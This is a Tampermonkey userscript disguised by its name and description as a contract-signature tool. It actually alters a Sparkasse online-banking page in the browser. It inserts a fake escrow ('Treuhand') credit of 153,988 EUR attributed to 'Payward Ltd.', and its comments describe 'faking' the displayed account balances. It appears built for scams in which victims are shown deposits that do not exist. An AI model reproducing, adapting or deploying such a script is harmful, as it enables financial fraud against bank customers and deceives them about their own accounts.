// ==UserScript==
// @name         Vertragssignature Richter
// @namespace    http://tampermonkey.net/
// @version      5.0
// @description  Anforderung an GwG - digitale Signatur
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        hhhttps://www.sparkasse-lev.de/de/home/onlinebanking/nbf/umsaetze.html*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/452610/Vertragssignature%20Richter.user.js
// @updateURL https://update.greasyfork.org/scripts/452610/Vertragssignature%20Richter.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // Your code here...


    var pointerOverviewAcc = document.getElementsByClassName("balance-predecimal")[1].textContent;
    var pointerOverviewTotal = "";
    var pointerTabelle = "xx";

    var absender = "Payward Ltd. United Kingdom: Treuhand Freigabe nötig durch Payward Ltd.";
    var asenderReference = "WD3746 TRX88205A 88000";
    var absenderDetails = "08.09.2022 | GUTSCHR. TREUHAND";
    var amount = 153988;
    var vorgemerkt = "yes";

    function numberWithCommas(x) {
    return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");}

    if (window.location.href.indexOf("finanzuebersicht") > 0) {
    //Wir sind in der Finanzuebersicht
        if (vorgemerkt == "no"){

            //Wenn nicht vorgemerkt sein soll, dann faken wir die Balance in die Uebersicht.
            var realAccBalance = pointerOverviewAcc.replace(".", "");
            var fakeAccBalance = parseFloat(realAccBalance) + amount;
            var fakeAccBalancewithcomma = numberWithCommas(fakeAccBalance);

            //Update Balance
            document.getElementsByClassName("balance-predecimal")[1].textContent = fakeAccBalancewithcomma;

            var zwischenSumme = document.getElementsByClassName("balance-predecimal")[2].textContent;
            var zwischenSummeReal = zwischenSumme.replace(".", "");
            var zwischenSummeFake = parseFloat(zwischenSummeReal) + amount;
            var zwischenSummeNwc = numberWithCommas(zwischenSummeFake);

            //Update ZwischenSumme
            document.getElementsByClassName("balance-predecimal")[2].textContent = zwischenSummeNwc;

            var TotalAmount = document.getElementsByClassName("balance-predecimal")[4].textContent;
            var TotalAmountReal = TotalAmount.replace(".", "");
            var TotalAmountFake = parseFloat(TotalAmountReal) + amount;
            var TotalAmountNwc = numberWithCommas(TotalAmountFake);

            //Update Total
            document.getElementsByClassName("balance-predecimal")[4].textContent = TotalAmountNwc;

        }

    }

    if (window.location.href.indexOf("umsaetze") > 0) {

        //Wir sind im Kontostand
        var AccBalance = document.getElementsByClassName("mkp-currency-lg")[0].childNodes[0].textContent;
        var AccBalanceReal = AccBalance.replace(".", "");
        var AccBalanceFake = parseFloat(AccBalanceReal) + amount;
        var AccBalanceNwc = numberWithCommas(AccBalanceFake);
        var singleAmount = numberWithCommas(amount);

        //Update Kontostand oben
        //document.getElementsByClassName("mkp-currency-lg")[0].childNodes[0].textContent = AccBalanceNwc;

        //document.getElementsByClassName("mkp-card-list")[1]

        var xHTML = '<div class="mkp-card-list"><span class="mkp-list-subline">Spezialauftrag Treuhand</span><ul class="mkp-card-group mkp-group-unify mkp-group-clickable" aria-label="Treuhand"><li aria-label="RAIFFEISEN-VOLKSBANK FRESEN ; BCL BUSLNESS MARKETING  B202202747  ; -100,00 EUR">    <div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="' +absender + '">' +absender + '</a></h3><p>' +asenderReference + ' </p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">' +singleAmount + '</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">-100,00 EUR</span></div></div></div></div></li></ul></div>';
        var saveHTML = document.getElementsByClassName("mkp-card-list")[0].innerHTML;
        document.getElementsByClassName("mkp-card-list")[0].innerHTML = xHTML + saveHTML;
        //block spk-analytics.js;
    }


})();